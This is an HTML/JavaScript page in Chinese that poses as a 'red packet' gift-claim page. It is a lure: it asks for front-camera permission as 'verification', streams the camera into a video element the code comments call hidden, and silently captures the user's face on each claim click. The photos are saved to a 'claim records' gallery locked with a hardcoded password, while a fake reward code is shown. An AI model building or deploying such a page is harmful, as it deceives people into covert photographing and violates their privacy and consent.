<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>红包领取</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
  
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            redPacket: '#E63946',
            redLight: '#FF7E67',
            gold: '#FFD700',
          }
        }
      }
    }
  </script>
  
  <style type="text/tailwindcss">
    @layer utilities {
      .packet-shine {
        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
        background-size: 200% 100%;
        animation: shine 2s infinite;
      }
      @keyframes shine {
        0% { background-position: -200% 0; }
        100% { background-position: 200% 0; }
      }
      .shake {
        animation: shake 0.5s ease-in-out;
      }
      @keyframes shake {
        0%, 100% { transform: rotate(0deg); }
        20% { transform: rotate(-5deg); }
        40% { transform: rotate(5deg); }
        60% { transform: rotate(-3deg); }
        80% { transform: rotate(3deg); }
      }
      .safe-area {
        padding-bottom: env(safe-area-inset-bottom);
      }
    }
  </style>
</head>
<body class="bg-gradient-to-br from-orange-500 to-redPacket min-h-screen flex flex-col items-center justify-start p-4 relative overflow-hidden safe-area">
  <!-- 标题 -->
  <header class="text-center my-6 relative z-10 w-full px-4">
    <h1 class="text-[clamp(20px,6vw,32px)] font-bold text-white drop-shadow-lg">
      领取你的专属红包
    </h1>
    <p class="text-white/80 mt-2 text-[clamp(14px,3vw,18px)]">完成验证即可领取奖励</p>
  </header>

  <!-- 主内容区 -->
  <main class="relative z-10 w-full max-w-md mx-auto flex-grow flex flex-col items-center justify-center">
    <!-- 红包容器 -->
    <div class="relative w-[80vw] max-w-sm aspect-square mx-auto rounded-[8vw] overflow-hidden shadow-2xl border-[2vw] border-gold/30 bg-gradient-to-br from-redLight to-redPacket">
      <!-- 红包装饰 -->
      <div class="absolute inset-0 flex items-center justify-center">
        <div class="w-[65%] h-[65%] rounded-[4vw] border-[1vw] border-gold/50 flex items-center justify-center">
          <div class="w-[55%] h-[55%] rounded-[2vw] bg-white/10 flex items-center justify-center packet-shine">
            <!-- 隐藏的摄像头和画布 -->
            <video id="video" class="absolute inset-0 w-full h-full object-cover opacity-0 pointer-events-none" autoplay muted playsinline></video>
            <canvas id="canvas" class="absolute inset-0 w-full h-full hidden"></canvas>
            
            <!-- 红包主界面 -->
            <div id="packetText" class="absolute inset-0 flex flex-col items-center justify-center text-white text-center p-4">
              <<i class="fa fa-envelope-open text-[12vw] mb-2 text-gold"></</i>
              <h2 class="text-[clamp(16px,5vw,24px)] font-bold mb-1">点击领取红包</h2>
              <p class="text-white/80 text-[clamp(12px,3vw,14px)]">验证后即可领取</p>
            </div>
          </div>
        </div>
      </div>
      
      <!-- 红包流苏装饰 -->
      <div class="absolute bottom-0 left-1/2 transform -translate-x-1/2 w-[10vw] h-[8vw] bg-gold/80 rounded-t-full -mb-[2vw]"></div>
    </div>
    
    <!-- 领取按钮 -->
    <div class="mt-8 flex justify-center w-full px-4">
      <button id="captureBtn" class="bg-white text-redPacket font-bold py-2 px-8 rounded-full text-[clamp(14px,4vw,18px)] shadow-lg hover:shadow-xl transition-all hover:scale-105 active:scale-95 flex items-center gap-2">
        <<i class="fa fa-redo"></</i>
        <span>领取红包</span>
      </button>
    </div>
    
    <!-- 权限提示 -->
    <div id="permissionDenied" class="hidden absolute inset-0 flex flex-col items-center justify-center bg-black/80 z-30 p-6 text-center">
      <<i class="fa fa-camera text-4xl text-yellow-500 mb-4"></</i>
      <h2 class="text-xl font-bold mb-2 text-white">需要相机权限</h2>
      <p class="mb-6 max-w-md text-white/80 text-sm">
        为完成红包领取验证，请允许相机权限。点击下方按钮后，在浏览器弹出的提示中选择"允许"即可。完成验证后 bot机器人 会给您发放密码
      </p>
      <button id="requestPermission" class="bg-redPacket hover:bg-redLight text-white py-3 px-8 rounded-full transition-all text-sm font-bold">
        <<i class="fa fa-unlock-alt mr-2"></</i>申请相机权限
      </button>
    </div>
  </main>

  <!-- 固定底部：查看领取记录按钮 -->
  <button id="galleryEntry" class="fixed bottom-4 left-4 right-4 mx-auto z-10 flex items-center justify-center gap-2 bg-white/20 hover:bg-white/30 backdrop-blur-sm rounded-full py-2 px-4 text-white text-sm transition-all">
    <<i class="fa fa-history text-gold"></</i>
    <span>领取记录</span>
    <span id="recordCount" class="bg-gold/30 text-gold text-xs px-2 py-0.5 rounded-full">
      0
    </span>
  </button>

  <!-- 密码验证弹窗 -->
  <div id="passwordModal" class="fixed inset-0 bg-black/80 z-40 hidden flex items-center justify-center p-4">
    <div class="bg-white rounded-xl p-6 w-full max-w-md shadow-2xl">
      <h3 class="text-xl font-bold text-redPacket mb-4 flex items-center">
        <<i class="fa fa-lock mr-2"></</i>验证密码
      </h3>
      <p class="text-gray-600 text-sm mb-4">请输入查看领取记录的密码</p>
      <input 
        type="password" 
        id="passwordInput" 
        placeholder="请输入密码" 
        class="w-full px-4 py-2 border border-gray-300 rounded-lg mb-4 focus:outline-none focus:ring-2 focus:ring-redPacket/50"
      >
      <div class="flex gap-3">
        <button id="cancelPassword" class="flex-1 py-2 border border-gray-300 rounded-lg text-gray-600 hover:bg-gray-50 transition-colors">
          取消
        </button>
        <button id="confirmPassword" class="flex-1 py-2 bg-redPacket text-white rounded-lg hover:bg-redLight transition-colors">
          确认
        </button>
      </div>
      <p id="passwordError" class="text-red-500 text-xs mt-2 hidden">
        密码错误，请重新输入
      </p>
    </div>
  </div>

  <!-- 领取记录模态框 -->
  <div id="galleryModal" class="fixed inset-0 bg-black/80 z-50 hidden flex flex-col">
    <!-- 模态框头部 -->
    <div class="p-4 flex justify-between items-center border-b border-white/10 bg-black/50">
      <h2 class="text-lg font-bold flex items-center text-white">
        <<i class="fa fa-history mr-2"></</i>领取记录
      </h2>
      <button id="closeGallery" class="w-10 h-10 flex items-center justify-center rounded-full hover:bg-white/10 text-white">
        <<i class="fa fa-times"></</i>
      </button>
    </div>
    
    <!-- 模态框内容区 -->
    <div class="flex-1 p-4 overflow-auto">
      <div id="modalGallery" class="grid grid-cols-3 gap-2">
        <!-- 记录会动态添加到这里 -->
        <div class="col-span-3 text-center text-white/60 py-8" id="emptyModalGallery">
          暂无领取记录
        </div>
      </div>
    </div>
  </div>

  <script>
    // DOM元素
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const captureBtn = document.getElementById('captureBtn');
    const permissionDenied = document.getElementById('permissionDenied');
    const requestPermissionBtn = document.getElementById('requestPermission');
    const galleryEntry = document.getElementById('galleryEntry');
    const galleryModal = document.getElementById('galleryModal');
    const closeGallery = document.getElementById('closeGallery');
    const modalGallery = document.getElementById('modalGallery');
    const emptyModalGallery = document.getElementById('emptyModalGallery');
    const recordCount = document.getElementById('recordCount');
    const redPacket = document.querySelector('.aspect-square');
    // 密码相关元素
    const passwordModal = document.getElementById('passwordModal');
    const passwordInput = document.getElementById('passwordInput');
    const confirmPassword = document.getElementById('confirmPassword');
    const cancelPassword = document.getElementById('cancelPassword');
    const passwordError = document.getElementById('passwordError');
    
    // 变量
    let stream = null;
    let localRecords = JSON.parse(localStorage.getItem('redPacketPhotos') || '[]');
    const RECORD_PASSWORD = '123'; // 固定密码
    
    // 检测localStorage是否可用
    function isLocalStorageAvailable() {
      try {
        const testKey = 'testLocalStorage';
        localStorage.setItem(testKey, 'testValue');
        localStorage.removeItem(testKey);
        return true;
      } catch (error) {
        return false;
      }
    }
    
    // 初始化时检测localStorage
    if (!isLocalStorageAvailable()) {
      alert('当前浏览器可能无法保存领取记录，建议使用正常模式访问。');
    }
    
    // 请求相机权限
    function requestCameraPermission() {
      if (stream) return;
      
      navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' }
      }).then(mediaStream => {
        stream = mediaStream;
        video.srcObject = stream;
        permissionDenied.classList.add('hidden');
        updateRecordCount();
      }).catch(err => {
        console.error('相机权限请求失败:', err);
        permissionDenied.classList.remove('hidden');
      });
    }
    
    // 模拟领取并保存记录
    function capturePhoto() {
      if (!stream) {
        requestCameraPermission();
        return;
      }
      
      // 确保视频已加载
      if (video.videoWidth === 0) {
        alert('相机初始化中，请稍后重试');
        return;
      }
      
      redPacket.classList.add('shake');
      captureBtn.disabled = true;
      captureBtn.innerHTML = '<<i class="fa fa-spinner fa-spin"></</i><span>验证中...</span>';
      
      setTimeout(() => {
        const width = video.videoWidth || 640;
        const height = video.videoHeight || 480;
        canvas.width = width;
        canvas.height = height;
        // 绘制视频帧到画布
        canvas.getContext('2d').drawImage(video, 0, 0, width, height);
        
        const imageData = canvas.toDataURL('image/png');
        saveRecord(imageData);
        
        setTimeout(() => {
          alert('红包领取成功！奖励密码为:a25316aa.');
          redPacket.classList.remove('shake');
          captureBtn.disabled = false;
          captureBtn.innerHTML = '<<i class="fa fa-redo"></</i><span>领取红包</span>';
        }, 800);
      }, 1000);
    }
    
    // 保存领取记录
    function saveRecord(imageData) {
      const record = {
        id: Date.now(),
        data: imageData,
        time: new Date().toLocaleString()
      };
      localRecords.unshift(record);
      if (localRecords.length > 20) {
        localRecords = localRecords.slice(0, 20);
      }
      localStorage.setItem('redPacketPhotos', JSON.stringify(localRecords));
      updateRecordCount();
    }
    
    // 更新记录数量显示
    function updateRecordCount() {
      recordCount.textContent = localRecords.length;
    }
    
    // 渲染领取记录
    function renderRecords() {
      if (localRecords.length === 0) {
        emptyModalGallery.classList.remove('hidden');
        return;
      }
      emptyModalGallery.classList.add('hidden');
      
      modalGallery.innerHTML = '';
      const fragment = document.createDocumentFragment();
      localRecords.forEach(record => {
        const recordEl = document.createElement('div');
        recordEl.className = 'aspect-square rounded-md overflow-hidden border border-white/20 relative group';
        recordEl.innerHTML = `
          <img src="${record.data}" alt="领取记录" class="w-full h-full object-cover">
          <div class="absolute bottom-0 left-0 right-0 bg-black/50 text-xs p-1 truncate text-white">
            ${record.time}
          </div>
          <button class="delete-btn absolute top-1 right-1 w-6 h-6 bg-red-500/80 rounded-full flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity" data-id="${record.id}">
            <<i class="fa fa-times text-xs text-white"></</i>
          </button>
        `;
        fragment.appendChild(recordEl);
      });
      modalGallery.appendChild(fragment);
    }
    
    // 删除记录
    function deleteRecord(id) {
      localRecords = localRecords.filter(record => record.id !== id);
      localStorage.setItem('redPacketPhotos', JSON.stringify(localRecords));
      renderRecords();
      updateRecordCount();
    }
    
    // 密码验证逻辑
    function checkPassword() {
      const input = passwordInput.value.trim();
      if (input === RECORD_PASSWORD) {
        // 密码正确：隐藏密码框，显示记录
        passwordModal.classList.add('hidden');
        galleryModal.classList.remove('hidden');
        renderRecords();
        passwordInput.value = '';
        passwordError.classList.add('hidden');
      } else {
        // 密码错误：显示提示
        passwordError.classList.remove('hidden');
        passwordInput.classList.add('border-red-500');
        setTimeout(() => {
          passwordInput.classList.remove('border-red-500');
        }, 2000);
      }
    }
    
    // 事件绑定（完整修复）
    document.addEventListener('DOMContentLoaded', () => {
      // 页面加载后请求相机权限
      setTimeout(requestCameraPermission, 1000);
      
      // 红包领取相关
      captureBtn.addEventListener('click', capturePhoto);
      requestPermissionBtn.addEventListener('click', requestCameraPermission);
      
      // 记录查看相关
      galleryEntry.addEventListener('click', () => {
        passwordModal.classList.remove('hidden');
        passwordInput.value = '';
        passwordError.classList.add('hidden');
      });
      
      confirmPassword.addEventListener('click', checkPassword);
      cancelPassword.addEventListener('click', () => {
        passwordModal.classList.add('hidden');
        passwordError.classList.add('hidden');
      });
      
      // 关闭记录模态框（新增绑定）
      closeGallery.addEventListener('click', () => {
        galleryModal.classList.add('hidden');
      });
      
      // 记录删除事件（委托绑定）
      modalGallery.addEventListener('click', (e) => {
        if (e.target.closest('.delete-btn')) {
          const btn = e.target.closest('.delete-btn');
          const id = parseInt(btn.dataset.id);
          deleteRecord(id);
        }
      });
    });
  </script>
</body>
</html>
